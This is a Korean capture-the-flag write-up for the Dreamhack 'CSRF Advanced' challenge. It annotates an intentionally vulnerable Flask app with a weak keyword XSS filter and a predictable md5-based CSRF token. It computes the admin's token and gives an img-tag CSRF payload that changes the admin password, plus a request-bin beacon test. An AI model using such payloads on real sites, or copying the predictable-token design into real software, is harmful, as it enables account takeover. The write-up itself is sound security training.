# [Dreamhack Wargame] CSRF Advanced
### [🚩CSRF Advanced](https://dreamhack.io/wargame/challenges/442/)
<img width="1068" alt="CSRF Advanced_Description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/8cf39278-0b3c-4580-bd0c-46694f9e2a1c">

* **CSRF**(Cross Site Request Forgery): 임의 이용자의 권한으로 임의 주소에 HTTP 요청을 보낼 수 있는 공격
    - CSRF를 막기 위해 웹 서비스는 CSRF Token을 사용하지만, **CSRF Token을 잘못된 방법으로 구현하였을 때 이를 우회할 수 있음**

<br/><br/>

## 문제 파일(app.py) 분석
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for
from selenium.webdriver.common.by import By
from selenium import webdriver
from hashlib import md5
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

users = {
    'guest': 'guest',
    'admin': FLAG
}

session_storage = {}
token_storage = {}

# read_url 함수: 셀레늄을 이용해 URL를 방문함 (admin 계정으로 로그인한 후 전달된 URL에 방문함)
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    options = webdriver.ChromeOptions()
    try:
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/login")
        driver.add_cookie(cookie)
        driver.find_element(by=By.NAME, value="username").send_keys("admin")
        driver.find_element(by=By.NAME, value="password").send_keys(users["admin"])
        driver.find_element(by=By.NAME, value="submit").click()
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


# check_csrf 함수
def check_csrf(param, cookie={"name": "name", "value": "value"}):
    # URL의 파라미터로 인자로 전달된 param 값을 넣어 vuln 페이지(CSRF 취약점 발생)의 URL를 설정함
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}" # 서버가 동작하고 있는 로컬호스트의 이용자가 전달하는 시나리오 → 127.0.0.1의 호스트로 접속하게 됨

    return read_url(url, cookie) # 생성한 url과 cookie를 read_url 함수의 인자로 주어 이 페이지에 방문함


# 인덱스(/) 페이지
@app.route("/")
def index():
    session_id = request.cookies.get('sessionid', None)
    try:
        username = session_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')

    return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not an admin"}')


# vuln 페이지: 이용자가 입력한 값을 출력함 (XSS가 발생할 수 있는 키워드는 필터링함)
@app.route("/vuln")
def vuln():
    # 이용자가 인자로 전달한 param 값을 가져와 이를 소문자로 변환함 (대소문자 혼용으로 XSS 필터링 우회 불가!)
    param = request.args.get("param", "").lower()
    
    xss_filter = ["frame", "script", "on"] # 필터링할 XSS 키워드 목록 (XSS 공격을 방지하기 위한 목적으로 사용됨)
    for _ in xss_filter: # "frame", "script", "on" 3가지의 악성 키워드를 필터링하여 키워드들을 "*" 문자로 치환함
        param = param.replace(_, "*")
        
    return param # 이용자가 전달한 param 파라미터의 값을 '그대로' 출력함


# flag 페이지: 전달된 URL에 임의 이용자가 접속하게끔 함 (해당 이용자는 admin 계정으로 로그인된 이용자임)
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET": # GET 메소드로 요청 시
        return render_template("flag.html") # 이용자에게 URL을 제공하는 페이지(flag.html)를 제공함
    elif request.method == "POST": # POST 메소드로 요청 시
        param = request.form.get("param", "") # 이용자가 전달한 param 파라미터의 값을 가져옴
        if not check_csrf(param): # check_csrf 함수에 param를 함수의 인자로 주고 이를 호출함
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


# login 페이지: 웹 서비스에 로그인함
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET': # GET 메소드로 요청 시
        return render_template('login.html') # 로그인 페이지(login.html)를 렌더링함
    elif request.method == 'POST': # POST 메소드로 요청 시
        # 이용자가 입력한 username과 password 값을 가져옴
        username = request.form.get('username')
        password = request.form.get('password')
        try:
            pw = users[username] # users에서 username에 해당하는 패스워드 값을 가져옴
        except:
            # users에서 username에 해당하는 값을 찾을 수 없는 경우 "user not found" 알림창을 화면에 출력함
            return '<script>alert("user not found");history.go(-1);</script>'
        if pw == password: # users에서 가져온 패스워드 값 pw와 이용자가 입력한 password 값이 같은 경우
            resp = make_response(redirect(url_for('index')) )
            
            # 로그안하는 과정에서 이용자별로 랜덤한 세션과 CSRF Token 값을 생성함
            session_id = os.urandom(8).hex()
            session_storage[session_id] = username
            token_storage[session_id] = md5((username + request.remote_addr).encode()).hexdigest()
                            # username과 이용자의 IP 주소를 이어붙인 후 md5 해시를 구하여 token 생성 → Token이 완전히 랜덤한 값으로 생성되지 않아 공격자가 유추할 수 있음
            
            resp.set_cookie('sessionid', session_id)
            return resp
        
        # users에서 가져온 패스워드 값 pw와 이용자가 입력한 password 값이 다른 경우 "wrong password"라는 알림창을 화면에 출력함
        return '<script>alert("wrong password");history.go(-1);</script>'


# change_password 페이지: 현재 로그인된 이용자의 비밀번호를 변경함
@app.route("/change_password")
def change_password():
    session_id = request.cookies.get('sessionid', None)
    
    try:
        username = session_storage[session_id]
        csrf_token = token_storage[session_id]
    except KeyError:
        return render_template('index.html', text='please login')
        
    pw = request.args.get("pw", None) # 이용자가 전달한 pw 인자값을 가져옴
    
    if pw == None:
        return render_template('change_password.html', csrf_token=csrf_token)
    else:
        if csrf_token != request.args.get("csrftoken", ""): # 이용자가 전달한 csrftoken 인자 값을 웹 서비스 내부에 저장된 현재 이용자의 Token 값과 다른지 비교
            return '<script>alert("wrong csrf token");history.go(-1);</script>' # 비교 결과 두 token 값이 다르다면 "wrong csrf token" 알림창을 출력함
        
        # 비교 결과 두 token 값이 같다면 비밀번호를 변경함
        users[username] = pw
        return '<script>alert("Done");history.go(-1);</script>'

app.run(host="0.0.0.0", port=8000)
```

<br/><br/>

## 문제 풀이
### 취약점 분석
* vuln 페이지에서 ```frame```, ```script```, ```on``` 외의 꺽쇠(```<```, ```>```)를 포함한 다른 키워드나 태그는 필터링하고 있지 않음 → XSS 공격은 수행할 수 없지만, CSRF 공격은 수행할 수 있음
    - 웹 서비스는 CSRF Token을 사용해 CSRF 공격을 방어하고 있음 → **Token 없이 CSRF를 수행하게 되면 실패하게 됨**
        + CSRF Token 값이 ```username```과 이용자의 IP 주소를 이어붙인 후 md5 해시를 구한 값으로 생성됨 <br/> &nbsp;&nbsp; = ⚠️ 완전히 랜덤하게 생성되지 않음 → ```admin```의 Token 값을 예측할 수 있음
        + CSRF Token 값 → ```username```과 이용자의 IP 주소를 이어붙인 후 md5 해시를 구한 값으로 생성됨 (⚠️ 완전히 랜덤하게 생성되지 않음)
            | 구성 요소 | 공격에 사용하는 값 |
            |:---:|:---:|
            | 이용자의 아이디(```username```) |```admin``` |
            | IP 주소 | ```127.0.0.1``` → ```admin```은 로컬호스트에서 접속함 |
            + 이를 이용해 공격자는 admin의 CSRF Token 값을 예측할 수 있음
                ```python
                # admin의 CSRF Token 계산 코드
                from hashlib import md5

                username = b"admin"
                ip_addr =b"127.0.0.1"
                csrf_token = md5(username + ip_addr).hexdigest()
                print(csrf_token) # 7505b9c72ab4aa94b1a4ed7b207b67fb 출력
                ```

<br/><br/>

### 익스플로잇
CSRF 공격이 가능한 vuln 페이지를 다른 이용자(```admin```)가 방문할 경우 의도하지 않은 페이지로 요청을 전송하는 시나리오를 작성
* 플래그를 얻기 위해서는 ```admin``` 계정으로 로그인해야 하기 때문에 ```admin```의 비밀번호를 변경함 <br/> &nbsp;&nbsp; → change_password 페이지를 이용하여 ```admin```의 비밀번호를 변경하는 요청을 전송하도록 익스플로잇을 수행해야 함
* CSRF 취약점 테스트
    1. ```<img>``` 태그를 사용해 외부 웹 서버(드림핵 툴즈의 Request Bin 기능 사용)로 요청을 보내는 공격 코드를 작성한 후, 취약점이 발생하는 vuln 페이지에 해당 코드를 삽입함
        ```
        <img src="https://RANDOMHOST.request.dreamhack.games">
        ```
    2. 외부 웹 서버에 요청이 온 것을 확인할 수 있음 *→ ⚠️ 해당 페이지에 CSRF 취약점이 존재함을 의미함*

<br/>

#### 익스플로잇 과정
1. flag 페이지에서 ```<img src="/change_password?pw=admin1234&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">```를 입력하고 제출 버튼을 누름
    - 비밀번호 변경은 /change_password 페이지에서 수행하며 다음의 두 개의 GET 파라미터를 전달받음
        | GET 파라미터 | 입력해야 하는 값 |
        |:---:|:---:|
        | ```pw``` | 변경하려는 비밀번호의 값 → ```admin1234```로 설정 |
        | ```csrftoken``` | 위에서 계산한 admin의 CSRF Token 값 → ```7505b9c72ab4aa94b1a4ed7b207b67fb``` |
    - "good" 알림창이 출력되고 나면 vuln 페이지로 방문한 계정의 비밀번호가 "admin1234"로 바뀌게 됨

<br/>

2. login 페이지로 이동하여 username에 "admin", password에 "admin1234"를 입력하고 [Login] 버튼을 누르면 admin 계정으로 로그인에 성공함 → index 페이지에 출력된 flag를 획득할 수 있음

